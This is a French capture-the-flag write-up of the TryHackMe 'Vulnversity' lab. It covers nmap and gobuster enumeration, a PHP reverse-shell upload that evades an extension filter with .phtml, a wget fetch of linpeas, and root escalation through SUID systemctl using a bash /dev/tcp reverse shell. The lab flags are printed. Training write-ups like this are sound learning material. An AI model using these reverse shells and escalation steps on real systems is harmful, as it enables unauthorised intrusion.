---
attachments: [Clipboard_2020-08-11-16-46-42.png]
tags: [cyber, débutant, suid, systemctl, tryhackme]
title: TryHackMe - Vulnversity
created: '2020-08-11T13:52:36.955Z'
modified: '2020-08-20T14:12:47.136Z'
---

# TryHackMe - Vulnversity

## Reconnaissance

On lance metasploit et on créé un nouveau workspace :

```sh
kali@kali:~$ sudo msfconsole -q # no banner mode
msf5 > workspace vulnversity
[*] Workspace: vulnversity
msf5 >
```

Lançons nmap pour énumérer l'ip `10.10.140.229` :

```sh
msf5 > db_nmap -sV -sS 10.10.140.229
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-11 10:07 EDT
[*] Nmap: Nmap scan report for 10.10.140.229
[*] Nmap: Host is up (0.061s latency).
[*] Nmap: Not shown: 994 closed ports
[*] Nmap: PORT     STATE SERVICE     VERSION
[*] Nmap: 21/tcp   open  ftp         vsftpd 3.0.3
[*] Nmap: 22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
[*] Nmap: 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 3128/tcp open  http-proxy  Squid http proxy 3.5.12
[*] Nmap: 3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
[*] Nmap: Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 33.84 seconds
```

Le nmap stocke les informations dans la base de données de metasploit, que l'on peut rappeler :

```sh
msf5 > hosts

Hosts
=====

address        mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------        ---  ----  -------  ---------  -----  -------  ----  --------
10.10.140.229             Linux                      server         
```

```sh
msf5 > services
Services
========

host           port  proto  name         state  info
----           ----  -----  ----         -----  ----
10.10.140.229  21    tcp    ftp          open   vsftpd 3.0.3
10.10.140.229  22    tcp    ssh          open   OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 Ubuntu Linux; protocol 2.0
10.10.140.229  139   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: WORKGROUP
10.10.140.229  445   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: WORKGROUP
10.10.140.229  3128  tcp    http-proxy   open   Squid http proxy 3.5.12
10.10.140.229  3333  tcp    http         open   Apache httpd 2.4.18 (Ubuntu)
```

## Locating directories with GoBuster

Le serveur est donc un Ubuntu Linux, qui expose 6 services, dont un web sur le port 3333 que l'on va énumérer avec `gobuster` :

```sh
kali@kali:~$ gobuster dir -u http://10.10.140.229:3333 -w /usr/share/wordlists/dirb/small.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.140.229:3333
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/11 10:43:29 Starting gobuster
===============================================================
/css (Status: 301)
/images (Status: 301)
/internal (Status: 301)
/js (Status: 301)
===============================================================
2020/08/11 10:43:36 Finished
===============================================================
```

## Compromise the web server

L'URL `internal` semble intéressante, il y a un service d'upload de fichiers.

On va souhaiter y charger un php reverse shell : https://github.com/pentestmonkey/php-reverse-shell

Il faut cependant modifier dans le fichier .php l'adresse d'écoute (notre machine) et le port que l'on souhaîte : 4444

```php
$ip = '10.11.7.104';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
```

Il faut ensuite ouvrir un listener netcat :

```sh
kali@kali:~$ nc -nlvp 4444
listening on [any] 4444 ...
```

Et charger le shell dans l'interface web. Cependant, le fichier est refusé pour cause `extension refusée`. Le serveur nous refuse l'extension .php car il est connu que c'est une extension qui fonctionne bien pour des fichiers malveillants. Essayons plusieurs extensions comme :

- php3
- php4
- php5
- phtml

L'extension .phtml est acceptée par le serveur. On va alors accéder à notre fichier à l'adresse : http://10.10.140.229:3333/internal/uploads/php-reverse-shell.phtml et cela va activer notre connexion netcat.

```sh
kali@kali:~$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.11.7.104] from (UNKNOWN) [10.10.140.229] 60774
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 11:08:20 up  1:14,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

On est bien dans le processus du serveur, on va pouvoir parcourir la machine pour trouver le flag :

```sh
$ ls /home
bill
$ ls /home/bill
user.txt
$ cat /home/bill/user.txt
8bd7992fbe8a6ad22a63361004cfcedb
```

## Privilege escalation

On va télécharger `linpeas` sur le serveur victime depuis un python SimpleHTTPServer sur notre machine :

```sh
kali@kali:~/privilege-escalation-awesome-scripts-suite/linPEAS$ sudo python -m SimpleHTTPServer 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 ...
10.10.140.229 - - [11/Aug/2020 11:14:42] "GET /linpeas.sh HTTP/1.1" 200 -
``` 

On télécharge sur le serveur grâce à wget :

```sh
$ cd /tmp
$ wget http://10.11.7.104/linpeas.sh
--2020-08-11 11:14:42--  http://10.11.7.104/linpeas.sh
Connecting to 10.11.7.104:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 233380 (228K) [text/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... .......... 21%  158K 1s
    50K .......... .......... .......... .......... .......... 43%  126K 1s
   100K .......... .......... .......... .......... .......... 65%  152K 1s
   150K .......... .......... .......... .......... .......... 87%  134K 0s
   200K .......... .......... .......                         100% 30.0K=2.3s

2020-08-11 11:14:44 (97.2 KB/s) - 'linpeas.sh' saved [233380/233380]
```

Il faut ensuite ajouter la permission de l'exécuter, puis on peut le lancer :

```sh
$ chmod +x linpeas.sh
$ ./linpeas.sh
```

Extrait de la sortie console :

```sh
====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms                                                                                                                      
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                                         
/usr/bin/newuidmap                                                                                                                                                           
/usr/bin/chfn           --->    SuSE_9.3/10
/usr/bin/newgidmap
/usr/bin/sudo           --->    /sudo$

/bin/ping6
/bin/umount             --->    BSD/Linux(08-1996)
/bin/systemctl <----------------------------------------------------------
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```

Linpeas nous indique qu'il y a une grosse faille grâce à la commande /bin/systemctl qui a des permissions trop prétentieuses. La lolbin https://gtfobins.github.io/gtfobins/systemctl/#suid indique comment l'exploiter. On va créer un reverse shell sur un port 4445,  différent de celui déjà utilisé.

Setup du listerner netcat sur notre machine :

```sh
kali@kali:~$ nc -lnvp 4445
listening on [any] 4445 ...
```

Exploit de systemctl sur la machine victime :

```sh
$ cd /tmp
$ echo "[Service]\nType=oneshot\nExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/10.11.7.104/4445 0>&1'\n[Install]\nWantedBy=multi-user.target" > /tmp/exploit.service
$ ls /tmp
exploit.service
$ /bin/systemctl link /tmp/exploit.service
Created symlink from /etc/systemd/system/exploit.service to /tmp/exploit.service.
$ /bin/systemctl enable --now /tmp/exploit.service
Created symlink from /etc/systemd/system/multi-user.target.wants/exploit.service to /tmp/exploit.service.
```

Retour du reverse shell sur notre machine :

```sh
kali@kali:~$ nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.11.7.104] from (UNKNOWN) [10.10.140.229] 48774
bash: cannot set terminal process group (21295): Inappropriate ioctl for device
bash: no job control in this shell
root@vulnuniversity:/# ls /root
ls /root
root.txt
root@vulnuniversity:/# cat /root/root.txt
cat /root/root.txt
a58ff8579f0a9270368d33a9966c7fd5
```
